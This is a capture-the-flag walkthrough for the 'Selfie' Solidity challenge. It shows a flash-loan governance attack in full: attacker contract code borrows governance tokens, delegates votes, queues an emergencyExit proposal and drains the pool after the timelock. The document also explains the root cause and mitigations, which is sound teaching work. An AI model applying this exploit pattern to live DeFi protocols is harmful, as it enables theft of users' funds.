## Challenge 6 Walkthrough: Selfie

### Vulnerability

The vulnerability lies in `SimpleGovernance.queueAction()`'s vote check:

```solidity
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    ...
    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });
    ...
}

function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

- Voting power is checked **only at queue time** — never at execution time
- Once a `GovernanceAction` is written to `_actions`, it is permanently valid regardless of whether the proposer still holds any tokens
- `SelfiePool` offers **free flash loans** of the same governance token used for voting:

```solidity
function flashFee(address _token, uint256) external view returns (uint256) {
    if (address(token) != _token) revert UnsupportedCurrency();
    return 0; // ← zero fee
}
```

- `emergencyExit` transfers the pool's **full current balance** to any address, gated only by `onlyGovernance`:

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);
}
```

The combination is fatal: borrow the governance token for free, acquire majority vote weight, queue a malicious proposal, repay the loan. The proposal outlives the tokens.

### Exploit

```solidity
function test_selfie() public checkSolvedByPlayer {
    SelfieAttacker selfieAttacker = new SelfieAttacker(pool, governance, token, recovery);
    selfieAttacker.startAttack();          // tx 1: flash loan → delegate → queue → repay
    vm.warp(block.timestamp + 2 days);     // satisfy ACTION_DELAY_IN_SECONDS
    selfieAttacker.executeProposal();      // tx 2: execute → pool drained
}
```

**`startAttack()` — everything critical happens in one transaction:**

```solidity
function startAttack() external {
    pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
}
```

The flash loan triggers `onFlashLoan()` as the callback:

```solidity
function onFlashLoan(address _initiator, address, uint256 _amount, uint256 _fee, bytes calldata)
    external returns (bytes32)
{
    require(msg.sender == address(pool),   "Only pool can call");
    require(_initiator == address(this),   "Initiator is not self");

    token.delegate(address(this));   // Step 1: register voting power

    actionId = governance.queueAction(   // Step 2: queue malicious proposal
        address(pool),
        0,
        abi.encodeWithSignature("emergencyExit(address)", recovery)
    );

    token.approve(address(pool), _amount + _fee);   // Step 3: approve repayment
    return CALLBACK_SUCCESS;
}
```

- **Step 1 — `token.delegate(address(this))`**: `DamnValuableVotes` is an `ERC20Votes` token. Holding tokens does not grant voting power — `getVotes()` returns 0 until you delegate. Without this call, `_hasEnoughVotes` returns false and `queueAction` reverts.
- **Step 2 — `queueAction`**: with 1.5M of 2M total supply delegated to self, `balance (1.5M) > halfTotalSupply (1M)` — vote check passes. The `GovernanceAction` struct is written to storage permanently.
- **Step 3 — repayment**: `approve` lets the pool pull its tokens back. `CALLBACK_SUCCESS` satisfies ERC3156. The flash loan completes — tokens returned, proposal still queued.

**`vm.warp(block.timestamp + 2 days)` — satisfy the timelock:**

`_canBeExecuted` requires `timeDelta >= ACTION_DELAY_IN_SECONDS` (2 days):
```solidity
return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
```

**`executeProposal()` — drain the pool:**

```solidity
function executeProposal() external {
    governance.executeAction(actionId);
}
```

`executeAction` has no access control — anyone can call it after the delay. It calls `pool.emergencyExit(recovery)` via `functionCallWithValue`, so `msg.sender` inside `emergencyExit` is `address(governance)`, satisfying the `onlyGovernance` modifier. `token.balanceOf(address(this))` — the full pool balance — transfers to recovery.

### Why It Works

The root cause is that `SimpleGovernance` has no holding period requirement. Voting power is read at the moment `queueAction()` is called and never verified again. Flash-loaned tokens exist only for the duration of one transaction, but one transaction is all that is needed to write a permanently valid proposal to governance storage.

A correct implementation would require the proposer to still hold sufficient votes at execution time, or impose a minimum holding period before tokens confer voting rights — making flash loan governance attacks impossible.

This is a **flash loan governance attack** — one transaction to queue, two-day wait, one transaction to execute, full pool drained. The same mechanism drove the real-world Beanstalk exploit (April 2022, ~$181M), where the absence of any timelock allowed queue and execution within a single transaction.

This attack class is formally cataloged as the **Queue-Time-Only Vote Check** pattern — voting power validated only when the proposal is queued, never re-verified at execution time. Even with a 2-day timelock, the proposal is permanently valid once written to storage because nothing re-validates the proposer's current holdings before execution. The mitigation is either to re-verify voting power at execution time, or to require tokens to have been held for a minimum number of blocks before they count toward votes (e.g., `getPastVotes(account, block.number - MIN_HOLD_BLOCKS)`) — which makes flash loan attacks structurally impossible since flash loans exist for only one transaction.

**Related challenges:** The `solidity-riddles` `Viceroy.sol` CTF teaches a parallel pattern through delegated authority abuse rather than flash-loaned governance, but with the same root cause: a state assumption (who currently holds authority) that doesn't hold across the full lifecycle of the privileged action.
